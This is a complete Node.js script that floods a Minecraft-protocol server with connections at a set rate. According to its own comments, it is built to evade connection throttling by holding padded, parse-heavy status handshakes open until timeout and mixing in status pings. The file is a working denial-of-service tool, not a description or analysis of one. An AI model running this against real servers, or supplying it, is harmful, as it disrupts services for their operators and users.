// mix.js <host> <port> <ratePerSec>
// Status-state connections: NOT subject to connection-throttle.
// 60% are handshakes held for the server's 5s status timeout,
// 40% are full status pings. Padded hostname to make handshake parsing heavier.
const net = require('net');

const HOST = process.argv[2];
const PORT = +process.argv[3];
const RATE = +(process.argv[4] || 700);
const PROTO = 774;
const HOLD_RATIO = 0.6;

const varint = n => {
  const o = []; n >>>= 0;
  do { let b = n & 0x7f; n >>>= 7; if (n) b |= 0x80; o.push(b); } while (n);
  return Buffer.from(o);
};
const frame = p => Buffer.concat([varint(p.length), p]);

const short = Buffer.from(HOST);
const long = Buffer.from(HOST + '.' + 'x'.repeat(180));
const port = Buffer.alloc(2);
port.writeUInt16BE(PORT);

const hs = a => frame(Buffer.concat([
  varint(0), varint(PROTO), varint(a.length), a, port, varint(1)
]));
const HS_HOLD = hs(long);
const HS_PING = Buffer.concat([hs(short), frame(Buffer.from([0]))]);

let held = 0, pings = 0, errs = 0;

function hold() {
  const s = net.createConnection({ host: HOST, port: PORT });
  let done = false, counted = false;
  const next = () => { if (done) return; done = true; if (counted) { held--; counted = false; } s.destroy(); };
  s.setNoDelay(true);
  s.on('connect', () => { counted = true; held++; s.write(HS_HOLD); });
  s.on('error', () => { errs++; next(); });
  s.setTimeout(5500, next);
}

function ping() {
  const s = net.createConnection({ host: HOST, port: PORT });
  let done = false;
  const next = () => { if (done) return; done = true; s.destroy(); };
  s.setNoDelay(true);
  s.on('connect', () => { s.write(HS_PING); pings++; });
  s.on('data', next);
  s.on('error', () => { errs++; next(); });
  s.setTimeout(3000, next);
}

setInterval(() => console.log(`held=${held} pings=${pings} errs=${errs}`), 5000);
const perTick = Math.max(1, Math.round(RATE / 20));
setInterval(() => {
  for (let i = 0; i < perTick; i++) Math.random() < HOLD_RATIO ? hold() : ping();
}, 50);